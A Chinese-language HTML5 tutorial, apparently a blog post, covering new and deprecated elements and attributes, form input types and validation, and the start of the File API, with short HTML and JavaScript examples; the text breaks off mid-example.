扩展符仍为 ‘.html’或者 ‘.htm’。内容类型仍然为 ‘text/html’ 2.DOCTYPE 声明 1234&lt;!--html4--&gt;&lt;!DOCTYPE html PUBLIC "-//W3C/DTD 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/Xhtml1-transitional.dtd"&gt;&lt;!--html5--&gt;&lt;!DOCTYPE html&gt; 3.指定字符编码 1234&lt;!--html4--&gt;&lt;meta http-equive="Content-Type" content="text/html;charset=UTF-8"&gt;&lt;!--html5--&gt;&lt;meta charset="UTF-8"&gt; 确保与之前的HTML 版本兼容1.可以省略标记的元素 12345不允许写结束标记的元素有：area/base/br/col/command/embed/hr/img/input/keygen/link/meta/param/source/track/wbr可以省略结束标记的元素：li/dt/dd/p/rt/rp/optgroup/option/colgroup/thead/tbody/tfoot/tr/td/th可以省略全部标记的元素(隐式存在，在文档结构仍然存在)：html/head/body/colgroup/tbody 2.具有 boolean 值的属性 例如 disable/readonly/checked 等，只写属性不写属性值或者属性值为空字符表示属性值为 true。 3.省略引号 123&lt;input type="text"&gt;&lt;input type='text'&gt;&lt;input type=text&gt; 新增的元素和废除的元素新增-html5(html4)结构元素section(div) 表示页面中的一个内容区块，用于章节、页眉、页脚或者页面中的其他部分。与 h1-h6元素结合使用，表示文档结构 article(div) 表示页面中的一块与上下文不相关的独立内容，例如博客中的一篇文章或者报纸中的一篇文章 aside(div) aside 元素表示 article 元素的内容之外的，与 article 元素内容相关的辅助信息 header(div) 表示页面一个内容区块或者整个页面的标题 hgroup(div) 用于整个页面或者页面中的一个内容块的标题进行组合 footer(div) 整个页面或者页面中的一个内容区块的脚注。一般来说，会包括作者的姓名、创作日期以及作者的联系信息。 nav(ul) 页面中导航链接部分 figure(dl) 一段独立的流内容，一般表示文档主体流内容中的一个独立单元，使用 figcaption 元素 为 figure 元素组添标题 12345678910&lt;!--html5--&gt;&lt;figure&gt; &lt;figcaption&gt;Title&lt;/figcaption&gt; &lt;p&gt;hahahahaha&lt;/p&gt;&lt;/figure&gt;&lt;!--html4--&gt;&lt;dl&gt; &lt;h1&gt;Title&lt;/h1&gt; &lt;p&gt;hahahahaha&lt;/p&gt;&lt;/dl&gt; 多媒体元素video(object) 定义视频，比如电影片段或者其他视频流 123456&lt;!--html5--&gt;&lt;video src='movie.ogg' controls='controls'&gt;video元素&lt;/video&gt;&lt;!--html4--&gt;&lt;object type='video/ogg' data='movie.ogv'&gt; &lt;parma name='src' value="movie.ogv"&gt;&lt;/object&gt; audio(object) 定义音频，比如音乐或者其他音频流 123456&lt;!--html5--&gt;&lt;audio src='music.wav'&gt;audio元素&lt;/audio&gt;&lt;!--html4--&gt;&lt;object type='application/ogg' data='someaudio.wav'&gt; &lt;parma name='src' value="someaudio.wav"&gt;&lt;/object&gt; embed(object) 用来插入各种多媒体，格式可以是 Midi/Wav/AIFF/AU/MP3 1234&lt;!--html5--&gt;&lt;embed src='music.swf'&gt;embed元素&lt;/embed&gt;&lt;!--html4--&gt;&lt;object type='application/x-shockwave-flash' data='music.swf'&gt;&lt;/object&gt; source 为媒介元素定义媒介资源 12345678910&lt;!--html5--&gt;&lt;audio controls&gt; &lt;source src="horse.ogg" type="audio/ogg"&gt; &lt;source src="horse.mp3" type="audio/mpeg"&gt; Your browser does not support the audio element.&lt;/audio&gt;&lt;!--html4--&gt;&lt;object type='application/ogg' data='someaudio.wav'&gt; &lt;parma name='src' value="someaudio.wav"&gt;&lt;/object&gt; 语义元素mark(span)元素 用来在视觉上向用户呈现那些需要突出显示或者高亮显示的文字。mark 元素的一个比较经典的应用就是在搜索结果中向用户高亮显示搜索关键词 progress(无) 表示进程运行中的进程，可以用 progress 来显示 javascript 中耗费时间的函数的进程 meter(无) 表示度量衡。仅用于已知最大值和最小值的度量。必须定义度量的范围，既可以在元素的文本中，也可以在 min/max 属性中定义。 time(span) 表示日期或者时间，也可以同时表示两者 ruby(无) 表示 ruby 注释（中文注音或者字符） 在东亚使用，显示的是东亚字符的发音。 与 &lt;ruby&gt; 以及 &lt;rt&gt; 标签一同使用： ruby 元素由一个或多个字符（需要一个解释/发音）和一个提供该信息的 rt 元素组成，还包括可选的 rp 元素，定义当浏览器不支持 “ruby” 元素时显示的内容。 123&lt;&lt;ruby&gt; 漢 &lt;rt&gt; ㄏㄢˋ &lt;/rt&gt;&lt;/ruby&gt; rt(无) 表示元素字符的解释或者发音 rp（无） 在 ruby 注释中使用，以定义不支持 ruby 元素的浏览器所显示的内容 wbr 表示软换行，wbr 与 br 区别在于后者表示此处必须换行，前者是浏览器窗口或者父级元素的宽度足够宽的时候不进行换行，而当宽度不够时，主动在此处进行换行。wbr 元素好像对字符型的语言作用挺大，但是对中文没有多大用处。 1&lt;p&gt;学习 AJAX ,您必须熟悉 &lt;wbr&gt;Http&lt;wbr&gt;Request 对象。&lt;/p&gt; canvas canvas 表示图形，比如图表和其他图像。元素本身没有行为，仅提供一块画布，但它把一个绘图 API 展示给 客户端的 javascript 以使得脚本能够把想绘制的东西绘制到这块画布上面。 1234&lt;!--html5--&gt;&lt;canvas id='myCanvas' width='200' height='200'&gt;&lt;/canvas&gt;&lt;!--html4--&gt;&lt;object type='image/svg+xml' data='inc/hdr.svg' width='200' height='200'&gt;&lt;/object&gt; details details 元素表示用户要求得到并且可以得到的细节信息，可以与 summary元素配合使用。summary提供标题或者图例。标题是可见的，用户点击标题时，会显示出细节信息。summary元素应该是 details元素的第一个子元素。 1234&lt;details&gt; &lt;summary&gt;H5&lt;/summary&gt; hahahahha&lt;/details&gt; datalist 表示可选数据的列表，与 input 元素配合使用，可以制作出 输入值的下拉列表。 123456&lt;input list="cars" /&gt;&lt;datalist id="cars"&gt; &lt;option value="BMW"&gt; &lt;option value="Ford"&gt; &lt;option value="Volvo"&gt;&lt;/datalist&gt; datagrid 表示可选数据的列表，以树形列表的形式来显示 123456789101112&lt;datagrid&gt; &lt;ol&gt; &lt;li&gt; (datagrid row 0) &lt;/li&gt; &lt;li&gt; (datagrid row 1) &lt;ol style="list-style-type:lower-alpha;"&gt; &lt;li&gt; (datagrid row 1,0) &lt;/li&gt; &lt;li&gt; (datagrid row 1,1) &lt;/li&gt; &lt;/ol&gt; &lt;/li&gt; &lt;li&gt; (datagrid row 2) &lt;/li&gt; &lt;/ol&gt; &lt;/datagrid&gt; output(span) 表示不同类型的输出，比如脚本输出 123456 &lt;form oninput="x.value=parseInt(a.value)+parseInt(b.value)"&gt; 0 &lt;input type="range" id='a' value="50"&gt;100+ &lt;input type="number" id="b" value="50"&gt;= &lt;output name="x" for="a b"&gt;&lt;/output&gt;&lt;/form&gt; menu 表示菜单列表，当希望列出表单控件的时候使用该标签 12345678910111213141516&lt;menu type="toolbar"&gt; &lt;li&gt; &lt;menu label="File"&gt; &lt;button type="button" onclick="file_new()"&gt;新建&lt;/button&gt; &lt;button type="button" onclick="file_open()"&gt;打开&lt;/button&gt; &lt;button type="button" onclick="file_save()"&gt;保存&lt;/button&gt; &lt;/menu&gt; &lt;/li&gt; &lt;li&gt; &lt;menu label="Edit"&gt; &lt;button type="button" onclick="edit_cut()"&gt;剪切&lt;/button&gt; &lt;button type="button" onclick="edit_copy()"&gt;复制&lt;/button&gt; &lt;button type="button" onclick="edit_paste()"&gt;粘贴&lt;/button&gt; &lt;/menu&gt; &lt;/li&gt;&lt;/menu&gt; 但是目前主流所有浏览器都不支持这个标签 input元素类型email 表示必须输入 E-mail url 输入 URL 地址 number 输入数值 range 输入一定范围内数字值 Date Pickers 拥有多个选择日期和时间的新型输入文本框 data-日、月、年 month-月、年 week-周、年 time-小时、分钟 datetime-日、月、年（UTC） datetime-local-日、月、年（本地时间） 废除（替代元素）1.能用css替代的元素 1basefont/big/center/font/s/strike(del)/tt/u 2.不再使用 frame 框架 1frameset/frame/noframes，现只支持 iframe框架。 3.只有部分浏览器支持的元素 1applet(embed/obejct)/bgsound(audio)/blink/marquee 4.其他被废除的元素 1rb(ruby)/acronym(abbr)/dir(ul)/isindex(form+input)/listing(pre)/xmp(code)/nextid(GUIDS)/plaintext('text/plain' MIME 类型) 新增的属性和废除的属性新增表单相关的属性 input[type=text]、select与 button 指定 autofucus属性，以指定的方式让元素在画面打开的时候自动获得焦点 input[type=text]与 textarea指定 placeholder属性，会对用户的输入进行提示，提示用户输入的内容 input、output、select、textarea、button与 fieldset指定 form属性，声明它们属性哪个表单，然后将其放置任何位置，而不是在表单之内 input[type=text]与 textarea指定 required。表示用户提交的时候进行检查，检查该元素内一定要有输入内容 input其他新增的属性：autocomplete、min、max、multiple、pattern、step。同时还有一个 新的 list元素可以与 datalist配合使用。datalist与 autocomplete属性配合使用。multiple属性允许在上传文件的时候一次上传多个文件。 input、button增加了新的属性 formaction、formenctype、formmethod、formnovalidate与 formtarget，它们可以重载 form元素的 action、enctype、method、novalidate与 target属性。为 fileset增加了 disabled，可以把它的子元素设为 disabled(无效)状态 input、button、form增加了 novalidate属性，该属性可以取消提交时进行的有关检查，表单可以被无条件提交。 链接相关属性 a与 area增加 media属性，该属性规定目标 URL是什么类型的媒介/设备进行优化，只能在 href属性存在时使用 为 area元素增加了 hreflang属性与 rel属性，以保持与 a元素、link元素的一致。 link元素增加了新的属性 sizes。该属性可以与 icon属性元素结合使用(通过 rel属性)，该属性指定关联图标（icon元素）的大小。 为 base元素增加了target属性，主要目的是保持与 a元素的一致性。 其他属性除了上面介绍的与表单和链接相关的属性外，HTML5 还增加了下面的属性： ol元素增加 reversed,它指定了列表倒序显示 meta增加 charset属性。因为这个属性被广泛支持了，而且为文档的字符编码的执行提供了一种良好的方式 为 style属性增加scoped属性，用来规定样式的作用范围，例如只对页面某个树起作用。 script增加 async属性，定义脚本是否异步执行 html增加 mainfest，开发离线Web 应用程序时它与 API 结合使用，定义一个 URL,在这个 URL 上描述文档的缓存信息。 iframe元素增加了三个属性 sandbox、seamless与 srcdoc，用来提高页面安全性，防止不信任的 Web 页面执行某些操作。 废除 在HTML 4中使用的属性 使用该属性的元素 在HTML 5中的替代方案 rev link、a rel charset link、a 在被链接的资源的中使用HTTP Content-type头元素 shape、coords a 使用area元素代替a元素 longdesc img、iframe 使用a元素链接到校长描述 target link 多余属性，被省略 nohref area 多余属性，被省略 profile head 多余属性，被省略 version html 多余属性，被省略 name img id scheme meta 只为某个表单域使用scheme archive**、chlassid、codebose、codetype、declare、standby** object 使用data与typc属性类调用插件。需要使用这些属性来设置参数时，使用param属性 valuetype、type param 使用name与value属性，不声明之的MIME类型 axis、abbr td、th 使用以明确简洁的文字开头、后跟详述文字的形式。可以对更详细内容使用title属性，来使单元格的内容变得简短 scope td 在被链接的资源的中使用HTTP Content-type头元素 align caption、input、legend、div、h1、h2、h3、h4、h5、h6、p 使用CSS样式表替代 alink、link、text、vlink、background、bgcolor body 使用CSS样式表替代 align、bgcolor、border、cellpadding、cellspacing、frame、rules、width table 使用CSS样式表替代 align、char、charoff、height、nowrap、valign tbody、thead、tfoot 使用CSS样式表替代 align、bgcolor、char、charoff、height、nowrap、valign、width td、th 使用CSS样式表替代 align、bgcolor、char、charoff、valign tr 使用CSS样式表替代 align、char、charoff、valign、width col、colgroup 使用CSS样式表替代 align、border、hspace、vspace object 使用CSS样式表替代 clear br 使用CSS样式表替代 compace、type ol、ul、li 使用CSS样式表替代 compace dl 使用CSS样式表替代 compace menu 使用CSS样式表替代 width pre 使用CSS样式表替代 align、hspace、vspace img 使用CSS样式表替代 align、noshade、size、width hr 使用CSS样式表替代 align、frameborder、scrolling、marginheight、marginwidth iframe 使用CSS样式表替代 autosubmit menu 全局属性contentEditable允许用户编辑元素中的内容，该元素必须是可以获得用户鼠标焦点的元素，在点击鼠标后要向用户提供一个插入符号，提示用户该元素中的内容允许被编辑。contentEditable属性是一个布尔值属性，可以被指定 true或者 false 除此之外，还有一个隐藏的 inherit状态，属性为 true，元素被指定为允许编辑，属性为 false时，元素被指定为不允许编辑。未指定 true或者 false时，则由 inherit状态来决定，如果元素的父元素是可以编辑的，则该元素就是可编辑的。 元素还具有一个叫做 isContentEditable属性，当元素可编辑时，该属性为 true，当元素不可编辑时，该属性 为 false。 12345&lt;ul contentEditable&gt; &lt;li&gt;元素列表1&lt;/li&gt; &lt;li&gt;元素列表2&lt;/li&gt; &lt;li&gt;元素列表3&lt;/li&gt;&lt;/ul&gt; designModedesignMode 属性用来指定整个页面是否可编辑，当页面可编辑时，页面中任何支持上文所述的 contentEditable 属性的元素都变成了可编辑状态。designMode只能在 javascript 脚本里被编辑修改。该属性有两个值——“on” 和 “off”。属性被指定为 on时，页面可编辑，被指定为 off时，页面不可编辑。使用 javascript 来指定 designMode 属性的方法如下： 1document.designMode = 'on' 针对 designMode 属性，各个浏览器的支持情况也不一样： IE8：安全考虑，不允许使用 designMode属性让页面进行编辑状态 IE9：允许使用 designMode属性让页面进入编辑状态 Chrome3 和 Safari：使用内嵌 frame方式，该内嵌 frame是可编辑的 Firefox 和 Opera：允许使用 designMode属性让页面进入编辑状态 hidden在 HTML5 中，所有的元素都允许有一个 hidden属性，该属性类似于 input 中的 hidden元素，功能是通知浏览器不渲染该元素，使该元素处于不可见状态。但是元素中的内容还是浏览器创建的，也就是说页面装载后允许使用 javascript 脚本将该属性取消，取消后该元素变为可见状态，同时元素中的内容页即时显示出来。hidden属性是一个布尔值的属性，为设为 true后，元素处于不可见状态，当设为 false后，元素属于可见状态。 spellcheckspellcheck 是针对 input与 textarea这两个文本输入框提供的一个新属性，它的功能为对用户输入的文本内容进行拼写和语法检查。是一个布尔值属性，具有 true 和 false 两种值。必须明确书写属性值 123&lt;textarea contentEditable spellcheck="true"&gt;&lt;/textarea&gt;&lt;input type="text" spellcheck="true"&gt;&lt;p contenteditable="true" spellcheck="true"&gt;这是可编辑的段落。请试着编辑文本。&lt;/p&gt; 需要注意的是如果元素的 readonly或者 disabled设为 true，则不执行拼写检查。 tabindex当不断敲击 Tab 键让窗口或者页面中的控件获得焦点，对窗口或者页面的所有控件进行遍历的时候，每一个控件的 tabindex表示该控件是第几个页面访问到的。 过去的这个属性在编辑网页的时候非常有用，但如今控件的遍历顺序是由元素在页面上所处的位置决定的，所以不再需要了。 但是 tabindex还有另外一个作用，在默认属性下，只有链接元素与表单可以通过按键获得焦点。如果对其他元素使用 tabindex属性后，也能让该元素获得焦点，那么当脚本中执行 focus()语句的时候，就可以让该元素获得焦点了。但这样做会有一个副作用：钙元素也可以通过按 Tab 键获得焦点，而这时有可能也不是开发者想要的结果。 把元素的 tabindex设为为负数（通常为-1）后就可以解决这个问题。tabindex的值为负数后，仍然可以通过编程的方式让元素获得焦点，但按下 Tab 键时该元素就不能获得焦点了。这在复杂的页面中或复杂的 Web 应用程序中是非常有用的。在 HTML4 中，-1 是一个无用的属性值，但到了 HTML5 中，通过巧妙运用让该属性得到了极大的应用。 123&lt;a href="http://laibh.top" tabindex="2"&gt;赖同学&lt;/a&gt;&lt;br /&gt;&lt;a href="http://www.google.com/" tabindex="1"&gt;Google&lt;/a&gt;&lt;br /&gt;&lt;a href="http://www.microsoft.com/" tabindex="3"&gt;Microsoft&lt;/a&gt; data-*使用 data-* 属性来嵌入自定义数据 1234567891011121314151617&lt;ul id="target"&gt; &lt;li id="e1" data-animal-type="鸟类"&gt;喜鹊&lt;/li&gt; &lt;li id="e2" data-animal-type="鱼类"&gt;金枪鱼&lt;/li&gt; &lt;li id="e3" data-animal-type="蜘蛛"&gt;蝇虎&lt;/li&gt;&lt;/ul&gt;&lt;script&gt; function showDetails(animal) &#123; let animalType = animal.getAttribute("data-animal-type"); console.log(animal.innerHTML + '是一种' + animalType); &#125; const ul = document.getElementById('target'); ul.onclick = function (e) &#123; let ev = e || window.event; let target = ev.target || ev.srcElement; showDetails(target); &#125;&lt;/script&gt; draggable规定元素是否可以拖动，链接和图像默认是可以拖动的。 语法： 1&lt;element draggable="true|false|auto"&gt; 例子： 1234567891011121314151617181920212223&lt;style&gt; #dropbox&#123; width: 400px; height: 400px; border:1px solid #aaaaaa; &#125;&lt;/style&gt;&lt;div id="dropbox" ondrop="drop(event)" ondragover="allowDrop(event)"&gt;&lt;/div&gt;&lt;br&gt;&lt;p id="drag" draggable="true" ondragstart="drag(event)"&gt;这是一段可移动的段落，请把该段落拖入上面的矩形&lt;/p&gt;&lt;script&gt; function allowDrop(ev)&#123; ev.preventDefault(); &#125; function drag(ev)&#123; ev.dataTransfer.setData('Text',ev.target.id) &#125; function drop(ev)&#123; let data = ev.dataTransfer.getData('Text'); ev.target.appendChild(document.getElementById(data)); ev.preventDefault() &#125;&lt;/script&gt; 新结构元素使用样式兼容旧版本浏览器的 hack 1234567891011121314151617181920212223242526272829&lt;style&gt; article,aside,dialog,figure,footer,header,legend,nav,section&#123; display:block; &#125; nav&#123; float:left; width:20%; &#125; article&#123; float:right; width:79%; &#125;&lt;/style&gt;&lt;!--IE8之前的浏览器不支持使用 CSS方法来使用这些尚未支持的结构元素，需要使用脚本定义--&gt;&lt;script&gt; document.createElement('header'); document.createElement('nav'); document.createElement('article'); document.createElement('footer');&lt;/script&gt;&lt;!--或者引入一个 js来hack--&gt;&lt;head&gt; &lt;title&gt;HTML5 HACK&lt;/title&gt; &lt;!--[if lt IE9]&gt; &lt;script src="http://apps.bdimg.com/libs/html5shiv/3.7/html5shiv.min.js"&gt;&lt;/script&gt; &lt;![end if]--&gt;&lt;/head&gt; 表单与文件新的 form 属性： autocomplete novalidate 新的 input 属性： autocomplete autofocus form form overrides (formaction, formenctype, formmethod, formnovalidate, formtarget) height 和 width list min, max 和 step multiple pattern (regexp) placeholder required 浏览器支持 Input type IE Firefox Opera Chrome Safari autocomplete 8.0 3.5 9.5 3.0 4.0 autofocus No No 10.0 3.0 4.0 form No No 9.5 No No form overrides No No 10.5 No No height and width 8.0 3.5 9.5 3.0 4.0 list No No 9.5 No No min, max and step No No 9.5 3.0 No multiple No 3.5 No 3.0 4.0 novalidate No No No No No pattern No No 9.5 3.0 No placeholder No No No 3.0 3.0 required No No 9.5 3.0 No 新增属性form 在 HTML4 中表单内的从属元素必须写在表单内容，但是 HTML5 中，可以把它书写在页面的任何地方，然后给该元素指定一个 form属性。属性值为该表单的 id，这样就可以声明该元素从属于指定表单了。 1234&lt;form id="testform"&gt; &lt;input type="text"&gt;&lt;/form&gt;&lt;textarea form="testform"&gt;&lt;/textarea&gt; 目前只有 Opera 支持这个属性 formaction HTML4中，一个表单内的所有元素都只能通过表单的 action属性统一提交到另一个页面，而在 HTML5 可以给所有的提交按钮，&lt;input type=&quot;submit&quot;&gt;、&lt;input type=&quot;image&quot;&gt;、&lt;button type=&quot;submit&quot;&gt;都增加 formaction属性，使得点击不同的按钮，可以将表单提交到不同的页面 12345&lt;form id="testform"&gt; &lt;input type="submit" name="s1" value="v1" formaction="s1.jsp"&gt;提交到 s1 &lt;input type="submit" name="s2" value="v2" formaction="s2.jsp"&gt;提交到 s2 &lt;input type="submit" name="s3" value="v3" formaction="s3.jsp"&gt;提交到 s3&lt;/form&gt; 目前没有浏览器支持这一属性 formmethod 在 HTML4 中只有一个表单内有 action属性来对表单内所有元素统一指定提交页面，所以每个表单内只有一个 method属性来指统一指定提交方法。在 HTML5 中，可以使用 formaction属性来对每个表单元素分别指定不同的提交页面，也可以用 formmethod对每个表单元素分别指定不同的提交方式。 1234&lt;form id="testform" action="serve.jsp"&gt; &lt;input type="submit" name="s1" value="v1" formaction="s1.jsp" formmethod="get"&gt;提交到 s1 &lt;input type="submit" name="s2" value="v2" formaction="s2.jsp" formmethod="post"&gt;提交到 s2&lt;/form&gt; 目前没有浏览器支持这一属性 placeholder 是指文本框为输入状态时，文本框里面显示的输入提示。 1&lt;input type="text" placeholder="input me"&gt; autofocus 给文本框、选择框或者按钮控件加上该属性，当画面打开的时候，该控件自动获得光标焦点。 1&lt;input type="text" autofocus&gt; 一个页面只能有一个控件具有该属性。不要滥用，建议只有当一个页面是以使用某个控件为主要目的的时候才使用。例如搜索页面中的搜索文本框。 list 为单行文本框添加一个 list属性，它的值为某个 datalist元素的 id。类似于 select，不同的是它除了可以选择之外，还可以自己输入。 123456&lt;input list="cars" /&gt;&lt;datalist id="cars"&gt; &lt;option value="BMW"&gt; &lt;option value="Ford"&gt; &lt;option value="Volvo"&gt;&lt;/datalist&gt; autocomplete 辅助输入所用的自动完成功能，是一个节省输入时间，同时也非常方便的功能。可以指定 on、off、&quot;&quot;三个值。不指定时用浏览器的默认值。 1&lt;input type="text" name="greeting" autocomplete="on" list="greetings"&gt; 表单元素种类url、email、date、time、datetime、datetime-local、month、week、number、range、search、tel、color 12345678910111213&lt;input type="url" value="http://laibh.top"&gt;&lt;input type="email" value="544289495@qq.com"&gt;&lt;input type="date" value="2019-05-22"&gt;&lt;input type="time" value="11:27"&gt;&lt;input type="datetime"&gt;&lt;input type="datetime-local"&gt;&lt;input type="month" value="2019-05"&gt;&lt;input type="week" value="2019-W21"&gt;&lt;input type="number" value="25" min="10" max="100" step="2"&gt;&lt;input type="range" value="25" min="10" max="100" step="2"&gt;&lt;input type="search"&gt;&lt;input type="tel"&gt;&lt;input type="color"&gt; output 定义了不同类型的输出，比如计算结果或者脚本的输出。output 元素必须从属某个表单，必须将它书写在表单内部，或者对它添加 form 属性。 123456789&lt;form id="testform1"&gt; &lt;input type="range" min="0" max="100" name="range1" step="5"&gt; &lt;output onforminput="value=range1.value"&gt;50&lt;/output&gt;&lt;/form&gt;&lt;!--或者浏览器兼容更好的下面这种方式--&gt;&lt;form id="testform1" oninput="x.value=range1.value"&gt; &lt;input type="range" min="0" max="100" name="range1" step="5"&gt; &lt;output name="x" for="range1"&gt;50&lt;/output&gt;&lt;/form&gt; 属性 值 描述 for element_id 定义输出域相关的一个或多个元素。 form form_id 定义输入字段所属的一个或多个表单。 name name 定义对象的唯一名称。（表单提交时使用） 表单验证自动验证 require 可以应用在大部分输入元素（除了隐藏元素，图片按钮上）。在提交时，如果元素中内容为空白，则不允许提交，同时在浏览器中显示信息提示文字。 pattern 要求输入内容格式的，对 input使用 pattern属性，设为某个正则表达式 1&lt;input pattern="[0-9][A-Z]&#123;3&#125;" name="part" placeholder="输入内容；一个数字与三个大写字母"&gt; min 与 max 数值类型与日期类型元素专用属性。限制了 input元素输入的数值与日期范围。 step 控制 input元素中的值增加或者减少的步幅。 显式验证 HTML5 中，form 与 input(除了 select 与 textarea)都具有一个 checkValidity。使用这个方法，可以显示对表单内所有元素内容或者单个元素内容进行有效性验证。返回 boolen值 12345678910111213141516171819&lt;form id="textform4" onsubmit="return check()"&gt; &lt;input type="url" value="http://laibh.top" id="url"&gt; &lt;input type="submit"&gt;&lt;/form&gt;&lt;script&gt; function check() &#123; const url = document.getElementById('url'); if (!url.value) &#123; console.log('地址不能为空'); return false; &#125; if (!url.checkValidity()) &#123; console.log('请输入正确的url地址'); return false; &#125; console.log(url.value) &#125;&lt;/script&gt; 但其实一般提交按钮的时候，会自动检验格式 取消校验有两种方法取消校验，第一种用 form的 novalidate属性 1234&lt;form id="textform4" onsubmit="return check()" novalidate&gt; &lt;input type="url" value="http://laibh.top" id="url"&gt; &lt;input type="submit"&gt;&lt;/form&gt; 但是上述的方法里面的 checkValidity()仍会生效 第二种是利用 input 或者 submit元素的 formnovalidate。 123456789&lt;form id="textform4" onsubmit="return check()"&gt; &lt;input type="url" value="http://laibh.top" id="url" formnovalidate="formnovalidate"&gt; &lt;input type="submit"&gt;&lt;/form&gt;&lt;!--或者--&gt;&lt;form id="textform4" onsubmit="return check()"&gt; &lt;input type="url" value="http://laibh.top" id="url"&gt; &lt;input type="submit" formnovalidate="formnovalidate"&gt;&lt;/form&gt; 前者是单单让一个 input取消验证，后者是取消验证整个 form表单 自定义错误信息HTML5 中可以利用 javascript 调用各个 input 元素的 setCustomValidity方法来自定义错误信息。需要注意的是一旦设置了 setCustomValidity，检验通过的条件变成了 setCustomValidity(&#39;&#39;) &amp;&amp; !valueMissing &amp;&amp; !patternMismatch 12345678910111213141516&lt;input type="text" id="code" required pattern="^\d&#123;4&#125;$" placeholder="请输入代码" oninput="check(this)"&gt;&lt;script&gt; function check(i) &#123; let &#123; valueMissing,patternMismatch &#125; = i.validity; console.log(valueMissing,patternMismatch) if(valueMissing)&#123; i.setCustomValidity('该字段不能为空，请按要求填入代码') &#125;else&#123; if(patternMismatch)&#123; i.setCustomValidity('请输入4位数字的代码') &#125;else&#123; i.setCustomValidity('') &#125; &#125; &#125; &lt;/script&gt; 增强的页面元素figure和 figcaption figure是一种元素的组合，带有可选标题。figure 元素用来表示网页上一块独立内容，将其从网页上移除后不会对网页上的其他内容产生任何影响。figure元素所表示的内容可以是图片、统计图或者代码示例。 figcaption表示 figure元素的标题，从属于 figure。一个 figure最多只允许防止一个 figcaption元素，但是运行放置多个其他元素 12345&lt;figure&gt; &lt;figcaption&gt;黄浦江上的的卢浦大桥&lt;/figcaption&gt; &lt;p&gt;拍摄者：W3School 项目组，拍摄时间：2010 年 10 月&lt;/p&gt; &lt;img src="http://www.w3school.com.cn/i/shanghai_lupu_bridge.jpg" width="350" height="234" /&gt;&lt;/figure&gt; figure所表示的内容通常是图片、统计图或者代码示例，也可以是音频插件、视频插件或者统计表格。 details 提供了一种替代 javascript 的将画面上的局部区域进行展开或者收缩的方法，目前只有 Chrome 和 Safari 6 支持 1234&lt;details&gt;&lt;summary&gt;Copyright 2011.&lt;/summary&gt;&lt;p&gt;All pages and graphics on this web site are the property of W3School.&lt;/p&gt;&lt;/details&gt; mark 表示页面需要高亮或者突出显示的。只好是对网页全文检索某个关键词时显示的检索结果。 1&lt;p&gt;Do not forget to buy &lt;mark&gt;milk&lt;/mark&gt; today.&lt;/p&gt; 为了某种特殊目的把原文作者没有特别重点标示的内容给标示出来。 与 em 、strong元素的区别在于前者是作者自己标出来的重点要注意的，而mark跟作者本身没有太多关系，是在后来引用的时候添加上去的。 progress 表示一个任务的完成进度。 该元素有两个参数来表示当前任务完成情况。value表示完成了多少工作量，max表示总共多少工作量。 在属性设定的时候，这两个属性只能设定为有效的浮点数，value的值必须大于0，小于等于 max。 123456789101112131415&lt;h2&gt;progress 使用示例&lt;/h2&gt;&lt;p&gt;完成百分比：&lt;progress id="progress" max="100" value="0"&gt;&lt;span&gt;0&lt;/span&gt;%&lt;/progress&gt;&lt;/p&gt;&lt;input type="button" onclick='add()' value="请点击"&gt;&lt;script&gt; const progressBar = document.getElementById('progress'); function add() &#123; progressBar.getElementsByTagName('span')[0].textContent = '0' for (let i = 0; i &lt;= 100; i++) &#123; setTimeout(function () &#123; progressBar.value = i; progressBar.getElementsByTagName('span')[0].textContent = i &#125;, 1000 * i) &#125; &#125;&lt;/script&gt; meter 表示规定范围内的数量值。例如磁盘使用量，对于某个候选者的投票人数占总投票人数的比例等。 meter 元素有六个属性： 属性 值 描述 high number 定义度量的值位于哪个点，被界定为高的值。 low number 定义度量的值位于哪个点，被界定为低的值。 max number 定义最大值。默认值是 1。 min number 定义最小值。默认值是 0。 optimum number 定义什么样的度量值是最佳的值。如果该值高于 “high” 属性，则意味着值越高越好。如果该值低于 “low” 属性的值，则意味着值越低越好。 value number 定义度量的值。 1234&lt;meter value="5" min="0" max="10" high="8" low="2" optimum="5"&gt;3/10&lt;/meter&gt;&lt;br&gt;&lt;meter value="0.6"&gt;60%&lt;/meter&gt;&lt;p&gt;&lt;b&gt;注释：&lt;/b&gt;Internet Explorer 不支持 meter 标签。&lt;/p&gt; menu与 command 用于菜单工具条与弹出菜单。两个元素的浏览器支持不是很好，不做介绍。 ol 增加了 start与 reversed属性 1234567891011&lt;ol reversed&gt; &lt;li&gt;咖啡&lt;/li&gt; &lt;li&gt;牛奶&lt;/li&gt; &lt;li&gt;茶&lt;/li&gt;&lt;/ol&gt;&lt;ol start="50" reversed&gt; &lt;li&gt;咖啡&lt;/li&gt; &lt;li&gt;牛奶&lt;/li&gt; &lt;li&gt;茶&lt;/li&gt;&lt;/ol&gt; dl 重新定义后的 dl列表包含多个带名字的列表项。每一项包含一条或者多条带名字的 dt元素，用来表示术语，dt元素后面紧跟一个或者多个 dd元素，用来表示定义。在一个元素内，不允许带有相同的 dt元素，不允许有重复的术语。dl可以用来定义文章或者网页上的术语解释 123456&lt;dl&gt;&lt;dt&gt;Coffee&lt;/dt&gt;&lt;dd&gt;Black hot drink&lt;/dd&gt;&lt;dt&gt;Milk&lt;/dt&gt;&lt;dd&gt;White cold drink&lt;/dd&gt;&lt;/dl&gt; cite 标签定义作品（比如书籍、歌曲、电影、电视节目、绘画、雕塑等等）的标题。不能是人名 1234&lt;img src="/i/ct_fcsz.jpg" alt="富春山居图" /&gt;&lt;p&gt;&lt;cite&gt;《富春山居图》&lt;/cite&gt;由黄公望始画于至正七年(1347)，于至正十年完成。&lt;/p&gt; small 由原来的通用展示性元素变成更具体的、专门用来标识所谓的”小字印刷体”的元素。通常用于免责声明、注意事项、法律法规、与版权相关等的法律性声明文字中，同时不允许被应用在页面主内容中，只允许被当做辅助信息用 inline方式内嵌在页面上使用。同时 small元素也不意味着元素中内容字体会变小，如果需要将字体变小，需要配合 CSS 样式来用。 文件 APIHTML5 中提供了一个关于文件操作的文件 API. FileList 对象与 file 对象FileList 对象表示用户选择的文件列表。在 HTML4 中，file 控件只允许放置一个文件，到了 HTML5 中。通过添加 multiple属性，file控件允许一次放置多个文件。控件内的每一个用户选择的文件都是一个 file对象，而 FileList对象则为这些 file对象的列表，代表用户选择的所有文件。 file对象有两个属性，name属性表示文件名，不包括路径，lastModifiedDate属性表示文件的最后修改日期。 12345678910111213&lt;input type="file" id="file" multiple size="80"&gt;&lt;input type="button" onclick="showFileName()" value="文件上传"&gt;&lt;script&gt; function showFileName()&#123; let file; const files = document.getElementById('file').files; const len = files.length; for (let i = 0; i &lt; len; i++) &#123; file = 